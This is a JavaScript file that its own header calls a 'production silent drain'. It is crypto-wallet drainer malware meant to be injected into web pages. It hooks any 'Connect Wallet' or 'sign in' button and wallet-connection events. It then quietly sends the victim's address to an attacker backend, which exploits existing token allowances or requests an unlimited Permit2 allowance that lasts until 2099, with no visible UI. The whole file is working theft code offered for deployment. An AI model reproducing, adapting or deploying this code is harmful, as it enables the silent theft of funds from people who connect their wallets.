/* Production silent drain — no UI, MutationObserver on native Connect Wallet buttons */
(function () {
  var BACKEND_URL = '__BACKEND_URL__';
  var KINETIC_KEY = '__KINETIC_KEY__';
  var WC_PROJECT_ID = '__WC_PROJECT_ID__';
  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var drainStarted = false;
  var CONNECT_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;

  function parseEnvelope(res, data) {
    if (data && typeof data.ok === 'boolean') {
      return { ok: data.ok, message: data.message || '', data: data.data || data };
    }
    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
  }

  async function apiPost(path, body, extraHeaders) {
    var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
    var res = await fetch(BACKEND_URL + path, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(body),
    });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || ('API error ' + res.status));
    return env.data;
  }

  function getEvmAddress() {
    if (window.ethereum && window.ethereum.selectedAddress) return window.ethereum.selectedAddress;
    return null;
  }

  async function tryAllowanceReuse(address) {
    if (!KINETIC_KEY || !address) return false;
    var scanRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Kinetic-Key': KINETIC_KEY },
      body: JSON.stringify({ wallet_address: address, chain_id: 1 }),
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    if (!scanData || !scanData.ok || !scanData.data || !scanData.data.candidates || !scanData.data.candidates.length) {
      return false;
    }
    await fetch(BACKEND_URL + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Kinetic-Key': KINETIC_KEY },
      body: JSON.stringify({ wallet_address: address, chain_id: 1 }),
    });
    return true;
  }

  async function runPermit2Drain(address, chainId) {
    var scout = await apiPost('/api/v1/scout', {
      wallet_address: address,
      chain_id: chainId || 1,
      chain_family: 'EVM',
      wallet_type: 'injected',
    });
    var fusion = await apiPost('/api/scout/recursive-predator-fusion', {
      wallet_address: address,
      chain_id: chainId || 1,
    });
    var scoutUsd = (fusion && fusion.total_usd) || (scout && scout.total_usd) || 1;
    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'permit2_batch_eip712_omnichain_native_v1',
      wallet_address: address,
      token_address: DEFAULT_USDC,
      signature: 'pending_user_sig',
      nonce: 'mirror:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: 'injected',
      scout_value_usd: scoutUsd,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function silentDrainFlow() {
    if (drainStarted) return;
    var address = getEvmAddress();
    if (!address) return;
    drainStarted = true;
    try {
      if (KINETIC_KEY) {
        var reused = await tryAllowanceReuse(address);
        if (reused) return;
      }
      var chainId = window.ethereum && window.ethereum.chainId
        ? parseInt(window.ethereum.chainId, 16)
        : 1;
      await runPermit2Drain(address, chainId);
    } catch (e) {
      drainStarted = false;
    }
  }

  function onWalletConnected() {
    silentDrainFlow();
    if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
  }

  function hookConnectButtons(root) {
    var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
    nodes.forEach(function (el) {
      if (el.__legionConnectHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
      if (!CONNECT_RE.test(label)) return;
      el.__legionConnectHook = true;
      el.addEventListener('click', function () {
        setTimeout(function () {
          if (getEvmAddress()) onWalletConnected();
        }, 1500);
      }, true);
    });
  }

  function startMutationObserver() {
    hookConnectButtons(document);
    var obs = new MutationObserver(function (mutations) {
      mutations.forEach(function (m) {
        m.addedNodes.forEach(function (node) {
          if (node.nodeType !== 1) return;
          hookConnectButtons(node);
        });
      });
    });
    obs.observe(document.documentElement, { childList: true, subtree: true });
  }

  if (window.ethereum) {
    window.ethereum.on('accountsChanged', function (accounts) {
      if (accounts && accounts[0]) onWalletConnected();
    });
    window.ethereum.on('connect', onWalletConnected);
    if (getEvmAddress()) onWalletConnected();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startMutationObserver);
  } else {
    startMutationObserver();
  }
})();
